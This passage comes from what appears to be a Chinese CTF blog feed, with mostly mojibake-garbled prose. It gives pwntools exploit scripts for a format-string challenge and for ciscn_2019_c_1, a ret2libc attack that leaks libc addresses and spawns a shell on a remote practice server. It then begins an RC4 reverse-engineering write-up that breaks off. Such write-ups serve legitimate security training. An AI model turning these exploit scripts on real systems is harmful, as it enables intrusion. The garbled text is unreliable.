class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n%19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>n + p32(addr) + p32(addr+1) + p32(addr+2) + p32(addr+3)ï¼ˆå› ä¸ºAAAAå¯ä»¥è¢«è§†ä¸ºç¬¬åä¸ªå‚æ•°ï¼Œå‰é¢åƒåœ¾æ•°æ®åŠ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ€»å…±å æ®äº†24ä¸ªå­—èŠ‚ï¼Œåˆ™ç¬¬ä¸€ä¸ªåœ°å€å€¼å¯ä»¥è§†ä¸ºç¬¬16ä¸ªå‚æ•°ï¼Œä¹‹åä»¥æ­¤ç±»æ¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25897</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">addr = <span class="number">0x804C044</span></span><br><span class="line">addr_w = p32(addr) + p32(addr+<span class="number">1</span>) + p32(addr+<span class="number">2</span>) + p32(addr+<span class="number">3</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;AAAA%16$n%17$n%18$n%19$n&#x27;</span> +addr_w</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;name:&#x27;</span>))</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>))</span><br><span class="line">payload2 = flat([<span class="built_in">str</span>(<span class="number">0x04040404</span>)])</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;fa16dae8-2cbf-43c2-8c5c-09ebc5b44087&#125;</code></p><h2 id="ciscn-2019-c-1">ciscn_2019_c_1</h2><p>ä¸€é“éå¸¸ç¦»è°±çš„é¢˜ç›®ï¼Œæ€è·¯æ¯”è¾ƒç®€å•ï¼Œæ ˆæº¢å‡ºæ„é€ å‡½æ•°è°ƒç”¨é“¾ï¼Œæ³„éœ²gotè¡¨é¡¹ï¼Œå³å‡½æ•°è£…è½½çš„åœ°å€ï¼Œå†æ ¹æ®è¿™ä¸ªå€¼ç®—å‡ºlibcåŸºå€ï¼Œä»è€Œè°ƒç”¨systemå‡½æ•°æ‹¿shellï¼Œåªæ˜¯ä¸€ç›´è·‘ä¸é€š :sob:<br>å€’ä¹Ÿä¸æ˜¯åŸç†æ²¡ææ¸…ï¼Œä¸»è¦æ˜¯ä¸€ç›´æŠ¥è«åå…¶å¦™çš„EOFï¼Œè®©äººä¸èƒ½ç†è§£ã€‚<br>(åæ¥å‘ç°å¤šåŠ äº†ä¸€ä¸ªrecvuntil()ï¼Œæˆ‘æ˜¯** :sob:)<br>checksecï¼Œ64ä½ï¼Œä»…å¼€å¯NXã€‚<br>IDAåˆ†æï¼Œä¸ºåŠ¨æ€é“¾æ¥å‡½æ•°ï¼Œpltè¡¨ä¸­æ— systemã€‚mainå‡½æ•°æ²¡æœ‰å¤ªå¤§çš„ä½œç”¨ï¼Œåªæ˜¯è¦æ±‚æˆ‘ä»¬çš„è¾“å…¥æ˜¯1æ—¶æ‰èƒ½è°ƒç”¨encryptå‡½æ•°ã€‚beginå‡½æ•°ä»…ä»…æ‰“å°å‡ ä¸²å­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆä½œç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; s[x] &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€çœ¼çœ‹åˆ°getså‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚æ ¹æ®åŠ¨æ€è°ƒè¯•ï¼Œéœ€è¦å¡«å……88å­—èŠ‚çš„åƒåœ¾æ•°æ®ï¼Œç”±äºåŠ å¯†ä¼šå¯¹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨\x00è¿›è¡Œæˆªæ–­ï¼ˆè²Œä¼¼ä¸æˆªæ–­ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡æˆªæ–­ä»¥åæ›´ç¨³å¦¥ï¼‰ï¼Œå³bâ€™\x00â€™åŠ 87ä¸ªå­—èŠ‚çš„å…¶ä»–æ•°æ®ï¼Œä»è€Œç»•è¿‡<code>v0&gt;=strlen(s)</code>çš„æ£€éªŒã€‚<br>é¦–å…ˆè¿™ä¸ªç¨‹åºä¸­æ— systemå‡½æ•°å’Œâ€™/bin/shâ€™ï¼ŒåŒæ—¶ç¨‹åºä¸­çš„gadgetä¸è¶³ä»¥æ”¯æŒæˆ‘ä»¬æ„é€ ç³»ç»Ÿè°ƒç”¨ï¼Œå†åŠ ä¸ŠASLRè‚¯å®šæ˜¯å¼€å¯çš„ï¼ŒlibcåŸºå€æ˜¯å˜åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ³„éœ²æŸä¸ªå‡½æ•°çš„çœŸå®åœ°å€ï¼Œä»è€Œæ ¹æ®è¯¥å‡½æ•°çš„åœ°å€å€¼ç®—å‡ºsystemå‡½æ•°ä»¥åŠâ€™/bin/shâ€™çš„åœ°å€å€¼ã€‚<br>æ„é€ æ€è·¯å¾ˆç®€å•ã€‚å½“encryptå‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œç¨‹åºå·²ç»è°ƒç”¨äº†gets, puts, getcharç­‰å‡½æ•°ï¼Œæ ¹æ®åŠ¨æ€é“¾æ¥çš„è£…è½½è§„å¾‹ï¼Œæ­¤æ—¶è¿™äº›å‡½æ•°çš„got.pltè¡¨ä¸­å·²ç»å¡«å…¥äº†å…¶çœŸå®åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†ç¨‹åºgotè¡¨ä¸­å†…å®¹æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©è¾“å‡ºå‡½æ•°putsã€‚è¯¥ç¨‹åºä¸º64ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾<code>pop rdi| ret</code>è¿™ä¸ªgadgetï¼Œä»è€Œå®ç°ä¼ å‚ã€‚<br>ä¸ºäº†å®ç°è·å–shellï¼Œæˆ‘ä»¬éœ€è¦è¿è¡Œä¸¤æ¬¡mainæˆ–encryptå‡½æ•°ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ³„éœ²åœ°å€ï¼Œç¬¬äºŒæ¬¡æ˜¯æ‹¿shellã€‚æ‰€ä»¥ä¸ºäº†å®ç°å¤šæ¬¡æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥mainå‡½æ•°æˆ–encryptå‡½æ•°çš„åœ°å€ã€‚æ‰€ä»¥ç¬¬ä¸€ä¸ªpayloadæˆ‘ä»¬å¯ä»¥æ„é€ ä¸ºï¼šbâ€™\x00â€™+bâ€™aâ€™*87è¦†ç›–å­å‡½æ•°æ ˆç©ºé—´å’Œå­˜æ”¾çˆ¶å‡½æ•°ebpçš„ä½ç½®ï¼Œ<code>pop rdi|ret</code>çš„åœ°å€ä½œä¸ºè¿”å›åœ°å€ï¼ŒæŸä¸ªåº“å‡½æ•°ï¼ˆè¿™é‡Œæˆ‘ä»¬é€‰ç”¨çš„æ˜¯getså‡½æ•°ï¼‰åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼Œä»¥åŠputså‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ï¼Œæœ€åè¿˜éœ€è¦åŠ ä¸Šmainå‡½æ•°æˆ–encryptå‡½æ•°çš„åœ°å€ã€‚<br>æˆ‘ä»¬æ¥æ”¶åœ°å€å€¼åï¼Œè¿˜éœ€è¦çŸ¥é“libcçš„ç‰ˆæœ¬ï¼ˆå› ä¸ºä¸åŒlibcå¯èƒ½åç§»é‡æœ‰åŒºåˆ«ï¼‰ï¼Œæ‰èƒ½è®¡ç®—å‡ºsystemå‡½æ•°çš„çœŸå®åœ°å€ã€‚LibcSearchç®—å‡ºçš„libcç‰ˆæœ¬æ²¡ä¸€ä¸ªæ˜¯å¯¹çš„ï¼ˆå…¨æ˜¯å¤æ—©ç‰ˆæœ¬çš„libcï¼Œå¯èƒ½æ˜¯å§¿åŠ¿ä¸å¯¹ï¼Œæˆ‘çœ‹ç½‘ä¸Šæœ‰å¤§ä½¬åˆ©ç”¨åˆ†é¡µæœºåˆ¶å¯¼è‡´libcå3ä½æ’ä¸å˜çš„åŸç†æ¥æ‰¾ï¼Œæˆ‘åªèƒ½%%%ï¼‰ï¼Œæœ€ç»ˆä¸€ä¸ªä¸€ä¸ªè¯•å‡ºæ¥äº†ï¼Œ<a href="http://xn--libc-2-h02m.27.so">æ˜¯libc-2.27.so</a>ã€‚<br>æœ€ç»ˆæ„é€ ç¬¬äºŒä¸ªpayloadæ‹¿shellï¼Œå¡«å……æ•°æ®ä¸ä¸Šä¸€ä¸ªpayloadä¸€è‡´ï¼Œåˆ†åˆ«ä¼ å…¥retnçš„åœ°å€ï¼ˆç»´æŠ¤å †æ ˆå¹³è¡¡ï¼Œé«˜ç‰ˆæœ¬ubuntuéœ€è¦å…³æ³¨è¿™ä¸€ç‚¹ï¼‰ï¼Œ<code>pop rdi|ret</code>åœ°å€ï¼Œ'/bin/shâ€™çš„åœ°å€ï¼Œsystemå‡½æ•°çš„çœŸå®åœ°å€ï¼Œè¿™é“é¢˜å°±è§£å†³äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26838</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 0x4006e0</span></span><br><span class="line">gets_gotplt = elf.got[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x602050</span></span><br><span class="line">vul_fun = elf.symbols[<span class="string">&#x27;main&#x27;</span>] </span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">87</span> +p64(pop_rdi_ret) + p64(gets_gotplt) + p64(puts_plt) + p64(vul_fun)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">re = r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_gets = u64(re+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(re)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_gets))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;gets&quot;,libc_gets)</span></span><br><span class="line"><span class="comment">#print(libc)</span></span><br><span class="line"></span><br><span class="line">libc_base = libc_gets - libc.symbols[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x800b0</span></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line"><span class="comment"># æ·»åŠ retnçš„åœ°å€æ˜¯ä¸ºäº†ç»´æŠ¤å †æ ˆå¹³è¡¡</span></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> +p64(ret)+p64(pop_rdi_ret) + p64(libc_sh) + p64(libc_system)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬ä¹Ÿå¯ä»¥è¿è¡Œï¼Œä¸¤ä¸ªè„šæœ¬æ€è·¯ä¸Šæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåªæ˜¯åœ¨ç¬¬ä¸€æ¬¡å‘é€payloadåè¿”å›çš„å‡½æ•°ä¸åŒã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26838</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 0x4006e0</span></span><br><span class="line">gets_gotplt = elf.got[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x602050</span></span><br><span class="line">vul_fun = elf.symbols[<span class="string">&#x27;encrypt&#x27;</span>] </span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">87</span> +p64(pop_rdi_ret) + p64(gets_gotplt) + p64(puts_plt) + p64(vul_fun)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">re = r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_gets = u64(re+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(re)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_gets))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;gets&quot;,libc_gets)</span></span><br><span class="line"><span class="comment">#print(libc)</span></span><br><span class="line"></span><br><span class="line">libc_base = libc_gets - libc.symbols[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x800b0</span></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> +p64(ret)+p64(pop_rdi_ret) + p64(libc_sh) + p64(libc_system)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;755b33e4-bac4-44bb-86ca-ff251d10ae56&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022é€†å‘æœŸæœ«è¯•é¢˜</title>
      <link href="/2022/07/re2022/"/>
      <url>/2022/07/re2022/</url>
      
        <content type="html"><![CDATA[<p>è¿™è¯¾ç»™åˆ†çœŸç¦»è°±ã€‚</p><h2 id="cpp-1">cpp.1</h2><p>æ˜¯RC4ç®—æ³•ã€‚æ˜“å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åˆå§‹å¯†é’¥0x0FC,0x0FB,0x3B,0x0D,0x73,0x6E</span><br><span class="line">byte_42C700ä¸º0x6E,0x65,0x11,0x0CF,0x1D,0x80,0x3B,0x4E,0x20,0x2A,0x0E0,0x0B6,0x0</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è§£å¯†ç¨‹åºè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°<code>Network</code>ã€‚<br>æœ¬é¢˜éœ€è¦åˆ†æçš„åœ°æ–¹æ²¡æœ‰ç»“æŸã€‚å…ˆå°†ä¸€äº›åœ°å€ä¿¡æ¯åˆ—åœ¨æ­¤å¤„ã€‚var_1F4ä¸ºæˆ‘ä»¬åŠ å¯†æ‰€å¾—å­—ç¬¦ä¸²å­˜å‚¨çš„åœ°å€ï¼Œvar_64ä¸ºæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²å­˜å‚¨çš„åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_64]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">push    0Ch             ; size_t</span><br><span class="line">lea     ecx, [ebp+var_64]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">lea     edx, [ebp+var_C8]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">add     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+var_1F4]</span><br><span class="line">push    eax             ; int</span><br><span class="line">lea     ecx, [ebp+var_C8]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    sub_40100A</span><br><span class="line">add     esp, 8</span><br><span class="line">push    7               ; size_t</span><br><span class="line">lea     edx, [ebp+var_58]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">lea     eax, [ebp+var_12C]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ä»£ç è¦æ±‚å°†var_12Cå¤„å­—ç¬¦ä¸²ä¸byte_42C600è¿›è¡Œå¼‚æˆ–ï¼Œbyte_42C600å¤„å­—ç¬¦ä¸²ä¸º<code>Notgood</code>ï¼Œå¹¶ä½¿ç”¨strcpyå°†å…¶å¤åˆ¶åˆ°var_1E8å¤„ã€‚var_12Cå¤„å­˜å‚¨å­—ç¬¦ä¸²ä¸var_58å¤„å­˜å‚¨å­—ç¬¦ä¸²ç›¸åŒï¼Œåˆå› ä¸ºvar_58ä¸var_64åœ°å€å·®12ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¤ä¸ºä¸‹åˆ—ä»£ç æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä»ç¬¬13å­—èŠ‚å¼€å§‹è¿›è¡Œå¤„ç†ã€‚var_1E8ä¸var_1F4ä¹Ÿå·®12ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œvar_1F4ï¼Œå³æˆ‘ä»¬åŠ å¯†æ˜æ–‡æ‰€å¾—çš„å­—ç¬¦ä¸²ï¼Œåªä¿ç•™å‰12ä¸ªå­—èŠ‚ï¼Œä»ç¬¬13å­—èŠ‚å¼€å§‹ï¼Œä¿ç•™çš„æ˜¯var_12Cå¤„å­—ç¬¦ä¸²ä¸byte_42C600è¿›è¡Œå¼‚æˆ–çš„ç»“æœã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_25C], 7</span><br><span class="line">jge     short loc_411C98</span><br><span class="line">mov     edx, [ebp+var_25C]</span><br><span class="line">movsx   eax, [ebp+edx+var_12C]</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42C600[ecx]</span><br><span class="line">xor     eax, edx</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">mov     [ebp+ecx+var_258], al</span><br><span class="line">jmp     short loc_411C53</span><br><span class="line">loc_411C53:</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">add     ecx, 1</span><br><span class="line">mov     [ebp+var_25C], ecx</span><br><span class="line">loc_411C98:             ; size_t</span><br><span class="line">push    7</span><br><span class="line">lea     edx, [ebp+var_258]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">lea     eax, [ebp+var_1E8]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">add     esp, 0Ch</span><br><span class="line">mov     [ebp+var_25C], 0</span><br><span class="line">jmp     short loc_411CCB</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­çš„é€»è¾‘æ˜¯è¦æ±‚æˆ‘ä»¬å°†var_1F4åœ°å€å¤„å¼€å§‹çš„13ä¸ªå­—ç¬¦ä¸byte_42C700çš„å‰13ä¸ªå­—ç¬¦è¿›è¡Œæ¯”è¾ƒã€‚var_1F4å‰12å­—èŠ‚æ˜¯RC4åŠ 